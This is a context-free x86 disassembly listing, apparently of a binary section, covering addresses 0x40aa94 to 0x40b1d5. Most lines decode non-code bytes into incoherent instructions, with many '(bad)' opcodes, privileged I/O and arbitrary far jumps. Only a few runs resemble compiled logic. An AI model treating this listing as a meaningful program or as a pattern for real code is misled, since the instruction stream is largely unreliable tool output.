  40aa94:	and    eax,0xa4da39e1
  40aa99:	fsub   DWORD PTR [ebx-0x3a]
  40aa9c:	clc    
  40aa9d:	jge    0x40ab19
  40aa9f:	stos   BYTE PTR es:[edi],al
  40aaa0:	leave  
  40aaa1:	hlt    
  40aaa2:	inc    edi
  40aaa3:	cmp    bh,ah
  40aaa5:	mov    ecx,0xcd433e1
  40aaaa:	stos   BYTE PTR es:[edi],al
  40aaab:	mov    al,0xf6
  40aaad:	inc    ebx
  40aaae:	mov    ?,eax
  40aab0:	ds cs jae 0x40ab14
  40aab4:	mov    ds:0x5be3e178,al
  40aab9:	mov    esp,0x8e399341
  40aabe:	cdq    
  40aabf:	in     eax,0x87
  40aac1:	mov    al,0x65
  40aac3:	xor    dl,BYTE PTR [edi]
  40aac5:	push   edi
  40aac6:	addr16 mov eax,cs:0xde9b
  40aacb:	aas    
  40aacc:	dec    edi
  40aacd:	lea    edx,[ebx+0x5af5ae9c]
  40aad3:	test   DWORD PTR [esi-0x3d],esp
  40aad6:	push   edi
  40aad7:	fistp  WORD PTR [esi+0x69]
  40aada:	outs   dx,DWORD PTR ds:[esi]
  40aadb:	(bad)  
  40aadd:	out    0xf4,eax
  40aadf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aae0:	mov    cl,0x34
  40aae2:	lds    ebx,FWORD PTR [ebx+0x761340ba]
  40aae8:	imul   edx,DWORD PTR [ebx+0x6a8ffa1f],0xfb508583
  40aaf2:	stos   DWORD PTR es:[edi],eax
  40aaf3:	cs int3 
  40aaf5:	loopne 0x40aad2
  40aaf7:	test   DWORD PTR [esi+0xef2ddb4],ecx
  40aafd:	mov    cl,0x60
  40aaff:	test   DWORD PTR [eax],ebx
  40ab01:	cwde   
  40ab02:	jmp    DWORD PTR [ecx]
  40ab04:	in     al,dx
  40ab05:	pusha  
  40ab06:	jbe    0x40ab2a
  40ab08:	arpl   WORD PTR [ebp-0x24],bx
  40ab0b:	push   eax
  40ab0c:	enter  0x94db,0xef
  40ab10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab11:	and    DWORD PTR [eax-0x38],0x2c
  40ab15:	xchg   al,ch
  40ab17:	(bad)  
  40ab18:	cmp    ebp,DWORD PTR [ebx]
  40ab1a:	fwait
  40ab1b:	in     al,dx
  40ab1c:	add    eax,0xf2339414
  40ab21:	in     eax,0x17
  40ab23:	(bad)  
  40ab24:	int    0x85
  40ab26:	and    al,0x6f
  40ab28:	hlt    
  40ab29:	popa   
  40ab2a:	cmp    bh,BYTE PTR [esi]
  40ab2c:	and    ebp,DWORD PTR [eax-0x12d6babd]
  40ab32:	push   es
  40ab33:	mov    ch,0xa9
  40ab35:	clc    
  40ab36:	xchg   ebx,eax
  40ab37:	ss mov ecx,0x8b14451a
  40ab3d:	or     DWORD PTR [eax],ecx
  40ab3f:	xor    DWORD PTR [esi-0x13],esp
  40ab42:	loop   0x40aaf1
  40ab44:	jo     0x40ab1f
  40ab46:	retf   
  40ab47:	xor    BYTE PTR [esi-0x6c],ch
  40ab4a:	pop    edi
  40ab4b:	adc    ecx,ebp
  40ab4d:	cmc    
  40ab4e:	js     0x40aaf5
  40ab50:	std    
  40ab51:	icebp  
  40ab52:	dec    eax
  40ab53:	divps  xmm3,xmm3
  40ab56:	cld    
  40ab57:	or     DWORD PTR [ecx-0x4a],0xffffff85
  40ab5b:	mov    ah,0x11
  40ab5d:	dec    edx
  40ab5e:	push   edx
  40ab5f:	push   eax
  40ab60:	shl    BYTE PTR [ebp-0x6b],1
  40ab63:	or     BYTE PTR [ebx+0x28],cl
  40ab66:	push   ecx
  40ab67:	fist   DWORD PTR [ecx]
  40ab69:	cmp    eax,0x2dc491f7
  40ab6e:	cmp    eax,0x8c9a5431
  40ab73:	bnd jnp 0x40abeb
  40ab76:	or     eax,DWORD PTR [ecx+eiz*4+0x5b36ecec]
  40ab7d:	mov    ebp,DWORD PTR [ebx-0x25a1cc2f]
  40ab83:	adc    al,0x46
  40ab85:	sysexit 
  40ab87:	push   ds
  40ab88:	out    dx,al
  40ab89:	mov    ebp,0xc1c37c9
  40ab8e:	add    BYTE PTR [ecx],dl
  40ab90:	lds    edi,FWORD PTR [ecx-0x76]
  40ab93:	dec    edx
  40ab94:	outs   dx,BYTE PTR ds:[esi]
  40ab95:	and    eax,0xe0f70bb7
  40ab9a:	cld    
  40ab9b:	jnp    0x40abd8
  40ab9d:	test   al,0x26
  40ab9f:	push   edi
  40aba0:	cmp    dh,0x16
  40aba3:	inc    edx
  40aba4:	shl    BYTE PTR [ebp+0x3a7ee78c],cl
  40abaa:	adc    al,0x48
  40abac:	out    0xcc,al
  40abae:	rol    DWORD PTR [ebx],1
  40abb0:	mov    eax,ds:0x1b33543e
  40abb5:	gs pop es
  40abb7:	jb     0x40abfd
  40abb9:	xchg   BYTE PTR [ebx+0x772aad41],dh
  40abbf:	push   ebx
  40abc0:	sub    al,0x5b
  40abc2:	add    ebp,eax
  40abc4:	bound  esp,QWORD PTR [eax]
  40abc6:	jmp    0x377f:0xafdee0d5
  40abcd:	out    0x7d,al
  40abcf:	outs   dx,DWORD PTR ds:[esi]
  40abd0:	adc    ecx,esp
  40abd2:	sbb    al,0x1a
  40abd4:	sti    
  40abd5:	(bad)
  40abd9:	pop    ecx
  40abda:	out    0xa5,al
  40abdc:	stos   DWORD PTR es:[edi],eax
  40abdd:	ds sti 
  40abdf:	or     eax,0x26cf3f6a
  40abe4:	retf   0x73ea
  40abe7:	add    edx,DWORD PTR [ecx]
  40abe9:	lods   al,BYTE PTR ds:[esi]
  40abea:	jae    0x40ac3f
  40abec:	push   ds
  40abed:	dec    ebx
  40abee:	lds    ebx,FWORD PTR [esi+edi*4]
  40abf1:	inc    ebp
  40abf2:	stos   DWORD PTR es:[edi],eax
  40abf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abf4:	mov    dh,0x86
  40abf6:	fsub   DWORD PTR [ebp+0x42]
  40abf9:	jae    0x40aba7
  40abfb:	xor    eax,0xde59220a
  40ac01:	push   edx
  40ac02:	adc    esp,DWORD PTR [esi]
  40ac04:	xchg   esp,eax
  40ac05:	cmp    al,0x98
  40ac07:	pcmpeqw mm4,QWORD PTR [ecx-0x5d]
  40ac0b:	mov    cl,BYTE PTR [ebp-0x6c]
  40ac0e:	sbb    DWORD PTR [edx+0x3d],ecx
  40ac11:	mov    dl,0xa
  40ac13:	iret   
  40ac14:	jbe    0x40abfc
  40ac16:	aas    
  40ac17:	(bad)  
  40ac18:	xor    ecx,DWORD PTR [eax+0x2279659c]
  40ac1e:	mov    ch,0x8f
  40ac20:	mov    ebx,0x81f284c6
  40ac25:	or     eax,0x9d0b21bc
  40ac2a:	sahf   
  40ac2b:	mov    dl,0xe8
  40ac2d:	(bad)  
  40ac2e:	es std 
  40ac30:	mov    ah,BYTE PTR [si]
  40ac33:	ins    BYTE PTR es:[edi],dx
  40ac34:	sbb    al,0xb8
  40ac36:	or     BYTE PTR [esi],dh
  40ac38:	inc    ebx
  40ac39:	and    DWORD PTR ds:0x121eee17,ecx
  40ac3f:	adc    BYTE PTR [ecx+ebp*1-0x3e],dh
  40ac43:	add    edi,ecx
  40ac45:	add    edx,ecx
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0x466a3c5e
  40ac5f:	mov    eax,esp
  40ac61:	mov    ?,WORD PTR ds:0xca7c7cfc
  40ac67:	jns    0x40ace5
  40ac69:	jl     0x40aca1
  40ac6b:	xchg   ecx,eax
  40ac6c:	fs dec esi
  40ac6e:	xlat   BYTE PTR ds:[ebx]
  40ac6f:	add    eax,DWORD PTR [edi-0x2e]
  40ac72:	enter  0xe3b8,0x32
  40ac76:	stc    
  40ac77:	xlat   BYTE PTR ds:[ebx]
  40ac78:	jge    0x40ac9e
  40ac7a:	cmp    eax,0x2cf732eb
  40ac7f:	scas   eax,DWORD PTR es:[edi]
  40ac80:	out    dx,al
  40ac81:	leave  
  40ac82:	in     eax,dx
  40ac83:	out    dx,al
  40ac84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac85:	repz jns 0x40ac43
  40ac88:	into   
  40ac89:	ins    DWORD PTR es:[edi],dx
  40ac8a:	adc    al,0xc0
  40ac8c:	inc    ecx
  40ac8d:	jmp    0x40ac25
  40ac8f:	sub    ecx,DWORD PTR [edx-0x7bedd9e0]
  40ac95:	into   
  40ac96:	bound  ebx,QWORD PTR [esp+edx*1+0x7f]
  40ac9a:	icebp  
  40ac9b:	mov    edx,es
  40ac9d:	scas   al,BYTE PTR es:[edi]
  40ac9e:	mov    cl,0x7a
  40aca0:	loop   0x40ad02
  40aca2:	sahf   
  40aca3:	or     dl,dh
  40aca5:	pop    ecx
  40aca6:	sbb    eax,ebp
  40aca8:	pop    es
  40aca9:	cmp    al,0xdc
  40acab:	cli    
  40acac:	stos   DWORD PTR es:[edi],eax
  40acad:	pop    eax
  40acae:	inc    esp
  40acaf:	dec    eax
  40acb0:	or     al,0xdd
  40acb2:	pop    ecx
  40acb3:	(bad)
  40acb7:	retf   
  40acb8:	xor    esi,0xffffffa5
  40acbb:	and    eax,0x55f76d6c
  40acc0:	cld    
  40acc1:	mov    eax,ds:0x36b0dbf8
  40acc6:	mul    DWORD PTR [esi-0x577a0432]
  40accc:	daa    
  40accd:	adc    DWORD PTR [ebp-0x77c4ba97],ecx
  40acd3:	stos   BYTE PTR es:[edi],al
  40acd4:	fisttp WORD PTR [edx]
  40acd6:	lock and eax,0xcff1f7c4
  40acdc:	push   esp
  40acdd:	push   es
  40acde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acdf:	lods   eax,DWORD PTR ds:[esi]
  40ace0:	sbb    ebx,DWORD PTR [eax]
  40ace2:	sbb    BYTE PTR fs:[ebp-0x38],dl
  40ace6:	ret    
  40ace7:	mov    ?,WORD PTR [esi]
  40ace9:	push   ebp
  40acea:	xor    eax,0x8c4d3b82
  40acef:	rcr    BYTE PTR [edx*1+0x639a3ba8],1
  40acf6:	sbb    dh,ch
  40acf8:	(bad)  
  40acf9:	jmp    0x40ac9b
  40acfb:	xchg   ebp,eax
  40acfc:	pop    eax
  40acfd:	xor    dl,al
  40acff:	test   al,0x6d
  40ad01:	jg     0x40ace6
  40ad03:	and    ah,ah
  40ad05:	inc    ecx
  40ad06:	out    0x2,al
  40ad08:	or     esp,DWORD PTR [esi]
  40ad0a:	or     ch,BYTE PTR [ebx]
  40ad0c:	fmul   QWORD PTR [ecx+0x55]
  40ad0f:	(bad)  
  40ad10:	and    BYTE PTR es:[ecx-0x11],bl
  40ad14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad15:	(bad)  
  40ad16:	in     al,dx
  40ad17:	mov    ch,0x52
  40ad19:	(bad)  
  40ad1a:	cmp    ah,BYTE PTR [esi]
  40ad1c:	xchg   ebx,eax
  40ad1d:	(bad)  
  40ad1e:	mov    bh,0x2c
  40ad20:	add    ebp,0xffffffc2
  40ad23:	xor    al,0x8c
  40ad25:	test   BYTE PTR [ebx],0x76
  40ad28:	aad    0xfc
  40ad2a:	push   esp
  40ad2b:	stc    
  40ad2c:	inc    eax
  40ad2d:	je     0x40acf9
  40ad2f:	inc    esp
  40ad30:	ins    DWORD PTR es:[edi],dx
  40ad31:	scas   al,BYTE PTR es:[edi]
  40ad32:	dec    edx
  40ad33:	inc    edx
  40ad34:	shl    al,0xa4
  40ad37:	clc    
  40ad38:	sar    bl,1
  40ad3a:	inc    edi
  40ad3b:	out    0x79,eax
  40ad3d:	cdq    
  40ad3e:	cmp    eax,ecx
  40ad40:	push   ds
  40ad41:	inc    ecx
  40ad42:	jle    0x40adbf
  40ad44:	sbb    ah,BYTE PTR [ebx-0x48f47c28]
  40ad4a:	mov    eax,0xdadb8481
  40ad4f:	sub    ch,BYTE PTR [eax]
  40ad51:	cdq    
  40ad52:	sub    esi,DWORD PTR [edi-0x5e]
  40ad55:	js     0x40acee
  40ad57:	neg    DWORD PTR [edi-0x377b23af]
  40ad5d:	fcom   DWORD PTR [esi-0x57c36077]
  40ad63:	push   0x8024c834
  40ad68:	dec    ebx
  40ad69:	push   esp
  40ad6a:	into   
  40ad6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad6c:	outs   dx,BYTE PTR ds:[esi]
  40ad6d:	and    DWORD PTR [edi],edx
  40ad6f:	imul   ebx,eax,0x54f48366
  40ad75:	ds and al,0xa8
  40ad78:	call   0x6996cef8
  40ad7d:	sbb    eax,0x3d8a09d3
  40ad82:	lods   al,BYTE PTR ds:[esi]
  40ad83:	inc    BYTE PTR [ebp+0x303d4656]
  40ad89:	iret   
  40ad8a:	push   0x960cc6cb
  40ad8f:	aad    0xa1
  40ad91:	adc    al,dh
  40ad93:	jne    0x40ad15
  40ad95:	xchg   esp,eax
  40ad96:	inc    esi
  40ad97:	dec    ebx
  40ad98:	repz sbb BYTE PTR [edi-0x72c00a3],cl
  40ad9f:	ins    BYTE PTR es:[edi],dx
  40ada0:	je     0x40adfa
  40ada2:	add    eax,0xc766583c
  40ada7:	out    0x24,al
  40ada9:	xor    BYTE PTR [ebx+0x49905776],dl
  40adaf:	retf   
  40adb0:	mov    ecx,0x678594ca
  40adb5:	jge    0x40adc1
  40adb7:	inc    edi
  40adb8:	sbb    DWORD PTR [eax],ecx
  40adba:	shl    BYTE PTR [ebx+0x20],cl
  40adbd:	cmp    dl,BYTE PTR [eax]
  40adbf:	mov    dh,0xb8
  40adc1:	outs   dx,DWORD PTR ds:[esi]
  40adc2:	jp     0x40ae04
  40adc4:	pop    esp
  40adc5:	clc    
  40adc6:	push   ds
  40adc7:	mov    dl,0xe8
  40adc9:	fadd   DWORD PTR [ebp+ebp*8-0x46]
  40adcd:	cs stos DWORD PTR es:[edi],eax
  40adcf:	dec    ebx
  40add0:	mov    ds,WORD PTR [eax-0x56]
  40add3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40add4:	pop    ebp
  40add5:	add    BYTE PTR ds:0x3bb7e22f,ah
  40addb:	mov    ah,0xf4
  40addd:	out    0x53,eax
  40addf:	leave  
  40ade0:	fdivrp st(5),st
  40ade2:	jo     0x40ade7
  40ade4:	aam    0x3c
  40ade6:	prefetch BYTE PTR [edx+ebp*2-0x5aae81a8]
  40adee:	adc    ch,0x76
  40adf1:	fist   DWORD PTR [edi]
  40adf3:	inc    edi
  40adf4:	shr    DWORD PTR ds:[esi+0x5c],cl
  40adf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adf9:	mov    esi,0x678fb29d
  40adfe:	(bad)  
  40adff:	enter  0xe441,0xb8
  40ae03:	mov    al,BYTE PTR [edi-0xf41b32d]
  40ae09:	adc    BYTE PTR [esi],bh
  40ae0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae0c:	or     eax,0xce1ccf7a
  40ae11:	xor    DWORD PTR es:[edx],0x5b
  40ae15:	mov    eax,ebp
  40ae17:	mov    esi,0x267fcad2
  40ae1c:	mov    bl,0xe
  40ae1e:	cmp    al,0x2c
  40ae20:	pop    ss
  40ae21:	clc    
  40ae22:	xlat   BYTE PTR ds:[ebx]
  40ae23:	jmp    0x40ae61
  40ae25:	aas    
  40ae26:	push   ecx
  40ae27:	or     ecx,ebp
  40ae29:	mov    DWORD PTR [ecx],ecx
  40ae2b:	jne    0x40ae3a
  40ae2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae2e:	mov    al,BYTE PTR [ecx-0x1f30ae7a]
  40ae34:	add    BYTE PTR [edx+0x12499426],0x72
  40ae3b:	cmp    bl,0xe1
  40ae3e:	ins    BYTE PTR es:[edi],dx
  40ae3f:	jg     0x40ae11
  40ae41:	es das 
  40ae43:	int3   
  40ae44:	js     0x40ae8f
  40ae46:	es or  eax,0x927fcd6f
  40ae4c:	fdivr  DWORD PTR [ecx+0x55ef55c9]
  40ae52:	jnp    0x40addb
  40ae54:	loop   0x40ae9b
  40ae56:	enter  0x5fc3,0x88
  40ae5a:	xchg   ebx,eax
  40ae5b:	add    dl,al
  40ae5d:	mov    al,ds:0x9740fbd5
  40ae62:	jmp    0x5dfc:0xae27aca8
  40ae69:	sub    eax,DWORD PTR [ebp-0x7a877cd0]
  40ae6f:	mov    al,ds:0x9dbac2bb
  40ae74:	or     DWORD PTR ds:0x88bd406c,eax
  40ae7a:	sub    ebx,edx
  40ae7c:	inc    ecx
  40ae7d:	dec    edi
  40ae7e:	ret    
  40ae7f:	fldenv ds:0x6089830a
  40ae85:	enter  0xf3e6,0xdf
  40ae89:	jmp    0x6dda:0x54c6ca88
  40ae90:	bound  ebp,QWORD PTR [ecx+0x7]
  40ae93:	fs push es
  40ae95:	stos   DWORD PTR es:[edi],eax
  40ae96:	mov    edi,0x90f6a1c1
  40ae9b:	jo     0x40aee8
  40ae9d:	pop    edx
  40ae9e:	or     eax,DWORD PTR ds:0xb7558105
  40aea4:	mov    ebp,0x54c49cd1
  40aea9:	popf   
  40aeaa:	cmp    eax,ebp
  40aeac:	cmc    
  40aead:	push   ebp
  40aeae:	fldlg2 
  40aeb0:	cs dec esp
  40aeb2:	mov    ebx,0xe4b19dd5
  40aeb7:	imul   eax,edx,0xdd27fe04
  40aebd:	stos   BYTE PTR es:[edi],al
  40aebe:	jmp    0x7fe7:0x70cae4e4
  40aec5:	test   DWORD PTR [ebp+0x7b],0x66c63dfe
  40aecc:	sbb    bl,BYTE PTR [esp+edx*8+0x4896c38a]
  40aed3:	jo     0x40ae8f
  40aed5:	mov    bl,0x5e
  40aed7:	mov    esp,0xcdb02ddd
  40aedc:	neg    DWORD PTR [edx+0x737eefdd]
  40aee2:	adc    eax,0x5cf2428c
  40aee7:	sub    BYTE PTR [edi-0x45],bh
  40aeea:	mov    cl,0x1f
  40aeec:	popa   
  40aeed:	and    bh,dl
  40aeef:	sbb    BYTE PTR [eax+0x4dc33efa],cl
  40aef5:	and    al,0xcd
  40aef7:	fwait
  40aef8:	push   esi
  40aef9:	add    dh,BYTE PTR [esi]
  40aefb:	lods   eax,DWORD PTR ds:[esi]
  40aefc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aefe:	push   ecx
  40aeff:	mov    ecx,0x34e64889
  40af04:	push   eax
  40af05:	outs   dx,BYTE PTR ds:[esi]
  40af06:	loop   0x40aea9
  40af08:	dec    edx
  40af09:	(bad)  
  40af0a:	(bad)  
  40af0c:	call   0x8320dd14
  40af11:	retf   
  40af12:	xchg   esi,eax
  40af13:	and    bh,dl
  40af15:	int3   
  40af16:	and    dh,BYTE PTR [ebp+0x6aa9516e]
  40af1c:	add    al,0x91
  40af1e:	sub    DWORD PTR [ebp+0x5d6e1ff0],ebx
  40af24:	js     0x40af07
  40af26:	mov    edx,0x64fc7a92
  40af2b:	xchg   ebx,eax
  40af2c:	xchg   ecx,eax
  40af2d:	sub    bl,BYTE PTR [ecx-0x6c65ad7a]
  40af33:	jmp    0xbcba:0xa849ef8
  40af3a:	lods   al,BYTE PTR ds:[esi]
  40af3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af3c:	cwde   
  40af3d:	test   al,0xa7
  40af3f:	add    al,0x14
  40af41:	mov    dh,0xea
  40af43:	mov    ah,0x30
  40af45:	add    eax,0x59ff9cb8
  40af4a:	out    dx,al
  40af4b:	aas    
  40af4c:	jl     0x40aef5
  40af4e:	and    DWORD PTR [edx+0x7c130563],esi
  40af54:	sub    ecx,DWORD PTR ds:0x283000dc
  40af5a:	pop    ss
  40af5b:	dec    eax
  40af5c:	aas    
  40af5d:	inc    ebp
  40af5e:	leave  
  40af5f:	adc    BYTE PTR [esi+ecx*8-0x2fae0953],al
  40af66:	mov    esp,0x394b44fe
  40af6b:	push   ss
  40af6c:	lock stc 
  40af6e:	pop    edx
  40af6f:	xchg   esi,eax
  40af70:	stc    
  40af71:	lods   eax,DWORD PTR ds:[esi]
  40af72:	fnstsw ax
  40af74:	mov    eax,ds:0x73da25db
  40af79:	arpl   di,si
  40af7b:	in     eax,0x59
  40af7d:	adc    al,0xee
  40af7f:	mov    ah,0xb1
  40af81:	loopne 0x40af84
  40af83:	adc    al,0x5c
  40af85:	sub    bl,bl
  40af87:	data16 fcom QWORD PTR [eax+0x55]
  40af8b:	jmp    0x40af70
  40af8d:	stc    
  40af8e:	and    eax,0x54de85a
  40af93:	push   esp
  40af94:	mov    ch,0xf3
  40af96:	mov    ds:0xe8eed6b3,eax
  40af9b:	or     edi,edi
  40af9d:	jmp    0x5f530c93
  40afa2:	adc    BYTE PTR [edi],dl
  40afa4:	fs pop edx
  40afa6:	mov    ecx,edx
  40afa8:	cdq    
  40afa9:	pop    ebx
  40afaa:	in     al,dx
  40afab:	push   ds
  40afac:	outs   dx,DWORD PTR ds:[esi]
  40afad:	ins    BYTE PTR es:[edi],dx
  40afae:	add    dh,BYTE PTR [edx+0x2831cd07]
  40afb4:	sbb    al,0xb1
  40afb6:	leave  
  40afb7:	xor    eax,0xa0a6978e
  40afbc:	adc    al,0x8
  40afbe:	inc    esp
  40afbf:	ja     0x40af4c
  40afc1:	pop    ebp
  40afc2:	lock sub ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fdiv   DWORD PTR [ebx-0x74aaa43e]
  40b004:	stc    
  40b005:	jl     0x40b083
  40b007:	retf   0x7c79
  40b00a:	jl     0x40afa3
  40b00c:	mov    DWORD PTR [edx],ebp
  40b00e:	xor    DWORD PTR [ecx-0x3a],eax
  40b011:	pushf  
  40b012:	outs   dx,DWORD PTR ds:[esi]
  40b013:	fnstcw WORD PTR [esi+0x3555626e]
  40b019:	adc    BYTE PTR [ecx+0x7c385e04],0x84
  40b020:	xchg   esp,eax
  40b021:	clc    
  40b022:	ss inc esi
  40b024:	jmp    0x732de8d2
  40b029:	cli    
  40b02a:	mov    DWORD PTR [ecx-0x3706a991],0xc9ec9ea4
  40b034:	aam    0x6e
  40b036:	xor    BYTE PTR [ebp-0x6e],cl
  40b039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b03a:	loop   0x40afc5
  40b03c:	dec    edx
  40b03d:	mov    gs,WORD PTR [ecx]
  40b03f:	and    ebx,eax
  40b041:	xchg   ecx,eax
  40b042:	(bad)  
  40b044:	pop    edx
  40b045:	push   es
  40b046:	jle    0x40b003
  40b048:	data16 and cl,0xbb
  40b04c:	shr    BYTE PTR [ebp+0x63],0xf4
  40b050:	pop    eax
  40b051:	jle    0x40afe5
  40b053:	add    edx,DWORD PTR [ebp-0x7d2a3497]
  40b059:	and    edi,DWORD PTR ds:0xdd58a3c5
  40b05f:	xor    al,0xc6
  40b061:	mov    ds:0xc571a33f,eax
  40b066:	push   ebx
  40b067:	inc    ebp
  40b068:	fcom   DWORD PTR [ebx]
  40b06a:	xchg   ebp,eax
  40b06b:	sti    
  40b06c:	ds mov bl,0xda
  40b06f:	jle    0x40b00c
  40b071:	or     al,0x9e
  40b073:	jl     0x40b020
  40b075:	ja     0x40b06f
  40b077:	xchg   esi,eax
  40b078:	mov    edi,0x4d6f3f07
  40b07d:	mov    edx,0x31a77336
  40b082:	ins    DWORD PTR es:[edi],dx
  40b083:	sbb    DWORD PTR [edi+eax*8],ebx
  40b086:	hlt    
  40b087:	fcmovbe st,st(5)
  40b089:	adc    eax,0xd4564a3a
  40b08e:	js     0x40b0c3
  40b090:	stc    
  40b091:	mul    DWORD PTR [edx+0x2ec21677]
  40b097:	xchg   BYTE PTR [esi+0x2c66adad],bl
  40b09d:	test   eax,0xabe4d231
  40b0a2:	inc    ebx
  40b0a3:	(bad)  
  40b0a4:	fld    QWORD PTR [eax]
  40b0a6:	push   edi
  40b0a7:	xchg   esp,edi
  40b0a9:	loopne 0x40b06f
  40b0ab:	in     al,0x5d
  40b0ad:	(bad)  [edi+0x5ef5cdcb]
  40b0b3:	sbb    DWORD PTR [edx-0x572fedd1],eax
  40b0b9:	je     0x40b0c6
  40b0bb:	add    DWORD PTR [ecx],edi
  40b0bd:	js     0x40b0f5
  40b0bf:	pusha  
  40b0c0:	iret   
  40b0c1:	jle    0x40b0b9
  40b0c3:	outs   dx,BYTE PTR ds:[esi]
  40b0c4:	xchg   BYTE PTR [edx+ecx*1-0x61a91de7],ah
  40b0cb:	mov    cl,0x46
  40b0cd:	es cmc 
  40b0cf:	mov    eax,ds:0x9dfe5eaf
  40b0d4:	mov    BYTE PTR [eax],bl
  40b0d6:	(bad)  
  40b0d7:	leave  
  40b0d8:	and    BYTE PTR [ecx+0x66],0x37
  40b0dc:	dec    edi
  40b0dd:	xchg   esp,eax
  40b0de:	cdq    
  40b0df:	sahf   
  40b0e0:	loope  0x40b100
  40b0e2:	add    dh,BYTE PTR [ecx+0x3243f970]
  40b0e8:	loope  0x40b153
  40b0ea:	dec    edx
  40b0eb:	add    eax,0xc02ff156
  40b0f0:	and    ch,0xef
  40b0f3:	or     cl,bh
  40b0f5:	cld    
  40b0f6:	sahf   
  40b0f7:	xchg   DWORD PTR [ebp+eax*4+0x4f],eax
  40b0fb:	mov    dl,0xfa
  40b0fd:	mov    ebx,0x7532a2
  40b102:	out    0xb1,al
  40b104:	mov    ch,0x57
  40b106:	jmp    0xbc0e42eb
  40b10b:	pop    esi
  40b10c:	mov    WORD PTR [ecx-0x78bd98],ss
  40b112:	mov    eax,0x52419ec6
  40b117:	sbb    DWORD PTR [ecx+ecx*4],edx
  40b11a:	aad    0x38
  40b11c:	adc    eax,0xa9fafaa0
  40b121:	jns    0x40b15c
  40b123:	cmp    eax,0x1a4d14a
  40b128:	(bad)  
  40b129:	push   edx
  40b12a:	outs   dx,BYTE PTR ds:[esi]
  40b12b:	in     eax,0xdd
  40b12d:	test   esi,ebp
  40b12f:	ret    0xe4f5
  40b132:	in     al,dx
  40b133:	cmp    DWORD PTR [ebx+0x2b],esp
  40b136:	addr16 push edx
  40b138:	pop    edx
  40b139:	adc    DWORD PTR [ecx+0x3e],0x6c831e7f
  40b140:	push   eax
  40b141:	dec    ebx
  40b142:	sub    DWORD PTR [ebp+ebx*1-0x270cc568],eax
  40b149:	mov    al,ds:0xb2ad8ec3
  40b14e:	mov    al,ds:0x606e747d
  40b153:	mov    fs,WORD PTR [ebx]
  40b155:	icebp  
  40b156:	sbb    DWORD PTR [ecx],esp
  40b158:	mov    al,ds:0x9ac3fc45
  40b15d:	inc    esp
  40b15e:	std    
  40b15f:	xor    edx,DWORD PTR [ecx]
  40b161:	xchg   BYTE PTR [ebp-0x6a],dl
  40b164:	mov    ebp,0x99b9c491
  40b169:	rol    DWORD PTR [ebx],0xfd
  40b16c:	mov    eax,ds:0xa1df06b2
  40b171:	sbb    edx,edx
  40b173:	pop    ds
  40b174:	aas    
  40b175:	shr    DWORD PTR [esi+esi*2],0x12
  40b179:	inc    edi
  40b17a:	sub    eax,0xff00dd13
  40b17f:	xchg   ebp,eax
  40b180:	xlat   BYTE PTR ds:[ebx]
  40b181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b182:	push   esi
  40b183:	iret   
  40b184:	dec    ebp
  40b185:	ret    0x5abb
  40b188:	hlt    
  40b189:	cmp    eax,0x5fad2934
  40b18e:	or     al,0x15
  40b190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b192:	jg     0x40b181
  40b194:	rcl    BYTE PTR [esi],0x96
  40b197:	test   al,0xb8
  40b199:	and    dl,bh
  40b19b:	mov    bl,ah
  40b19d:	dec    esi
  40b19e:	jl     0x40b12a
  40b1a0:	push   eax
  40b1a1:	jno    0x40b202
  40b1a3:	mov    bh,0x33
  40b1a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1a6:	inc    eax
  40b1a7:	inc    eax
  40b1a8:	imul   eax,DWORD PTR [edi-0x16],0x56
  40b1ac:	jbe    0x40b1ea
  40b1ae:	leave  
  40b1af:	outs   dx,BYTE PTR ds:[esi]
  40b1b0:	sbb    BYTE PTR [ebp-0x12],ch
  40b1b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1b4:	scas   eax,DWORD PTR es:[edi]
  40b1b5:	je     0x40b175
  40b1b7:	mov    bl,0x17
  40b1b9:	adc    ah,BYTE PTR [ebx-0x60]
  40b1bc:	popa   
  40b1bd:	or     al,0x9e
  40b1bf:	icebp  
  40b1c0:	in     al,0xf4
  40b1c2:	retf   
  40b1c3:	rcr    BYTE PTR [edi+0x49],0x82
  40b1c7:	pop    ecx
  40b1c8:	mov    ds:0xf7566e55,eax
  40b1cd:	adc    al,0xd5
  40b1cf:	adc    ecx,esp
  40b1d1:	hlt    
  40b1d2:	push   ebp
  40b1d3:	mov    bl,0x5d
  40b1d5:	xchg   ecx,eax
